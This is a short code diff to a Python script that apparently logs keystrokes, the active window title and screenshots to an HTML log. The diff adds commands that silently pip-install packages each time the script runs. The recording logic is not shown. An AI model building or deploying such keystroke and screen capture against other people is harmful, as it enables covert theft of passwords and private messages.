@@ -1,8 +1,14 @@
+import os
+os.system("pip install pynput")
+os.system("pip install pywin32")
+os.system("pip install win32gui")
+os.system("pip install pyautogui")
+os.system("pip install Pillow")
+
 from pynput.keyboard import Key, Listener
 from win32gui import GetWindowText, GetForegroundWindow
 from datetime import datetime
 import pyautogui
-import os
 
 screen_folder_path = "screenshots"
 log_file = "log.html"
